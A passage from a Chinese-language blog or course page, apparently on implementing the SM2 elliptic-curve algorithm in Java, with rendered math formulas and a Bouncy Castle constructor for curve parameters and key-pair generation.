369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3964.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4449.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4969.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5569.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="11.251ex" height="1.946ex" role="img" focusable="false" viewBox="0 -666 4972.8 860"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(444.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1222.4,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(2278.2,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(2917,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mn" transform="translate(3972.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>；</li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="21.609ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 9551.1 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="msup" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,413) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1687.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2688,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)"></path></g><g data-mml-node="msup" transform="translate(3688,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(462,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4831.3,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(5887.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(6387.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6776.1,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7654.1,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(8139.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(8659.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(9162.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>；</li>
<li>n 为素数；</li>
<li>h≤4；</li>
</ol>
<h3 id="SM2程序编写"><a href="#SM2程序编写" class="headerlink" title="SM2程序编写"></a>SM2程序编写</h3><ol>
<li><p><code>SM2.java</code>分析</p>
<ol>
<li>首先从<code>ecc_param</code>中获取参数对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="7.83ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 3461 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(503,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(1503,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2032,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(3032,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>赋值，来确定一条椭圆曲线<code>ecc_curve</code>；</li>
<li>同时获取<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.667ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.364ex" role="img" focusable="false" viewBox="0 -750 2870.9 1045"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(964.5,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msub" transform="translate(1964.5,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,-150) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>的值，得到基点G；</li>
<li>然后实例化一个<code>ECKeyGenerationParameters</code>对象来得到密钥生成器的相关参数；</li>
<li>最后实例化一个<code>ECKeyPairGenerator</code>对象生成密钥对；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SM2</span><span class="params">()</span> {  </span><br><span class="line">    <span class="built_in">this</span>.ecc_p = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">0</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_a = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">1</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_b = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">2</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_n = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">3</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_gx = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">4</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_gy = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(ecc_param[<span class="number">5</span>], <span class="number">16</span>);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_w = <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.ecc_gx_fieldelement = <span class="keyword">new</span> <span class="title class_">Fp</span>(<span class="built_in">this</span>.ecc_p, <span class="built_in">this</span>.ecc_gx);  </span><br><span class="line">    <span class="built_in">this</span>.ecc_gy_fieldelement = <span class="keyword">new</span> <span class="title class_">Fp</span>(<span class="built_in">this</span>.ecc_p, <span class="built_in">this</span>.ecc_gy);  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.ecc_curve = <span class="keyword">new</span> <span class="title class_">ECCurve</span>.Fp(<span class="built_in">this</span>.ecc_p, <span class="built_in">this</span>.ecc_a, <span class="built_in">this</span>.ecc_b); </span><br><span class="line">    <span class="built_in">this</span>.ecc_point_g = <span class="keyword">new</span> <span class="title class_">ECPoint</span>.Fp(<span class="built_in">this</span>.ecc_curve, <span class="built_in">this</span>.ecc_gx_fieldelement, <span class="built_in">this</span>.ecc_gy_fieldelement);  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.ecc_bc_spec = <span class="keyword">new</span> <span class="title class_">ECDomainParameters</span>(<span class="built_in">this</span>.ecc_curve, <span class="built_in">this</span>.ecc_point_g, <span class="built_in">this</span>.ecc_n);  </span><br><span class="line"></span><br><span class="line">    ECKeyGenerationParameters ecc_ecgenparam;  </span><br><span class="line">    ecc_ecgenparam = <span class="keyword">new</span> <span class="title class_">ECKeyGenerationParameters</span>(<span class="built_in">this</span>.ecc_bc_spec, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.ecc_key_pair_generator = <span class="keyword">new</span> <span class="title class_">ECKeyPairGenerator</span>();  </span><br><span class="line">    <span class="built_in">this</span>.ecc_key_pair_generator.init(ecc_ecgenparam);  </span><br><span class="line">}</span><br></pre></td></tr></table></figure></li>
<li><p>SM2算法加解密分析SM2Utils.java</p>
<ol>
<li><p>对明文M加密</p>
<p>流程如下，其中由于<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.451ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 2409.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mo" transform="translate(853.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1909.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，第3步计算<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="9.892ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4372.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 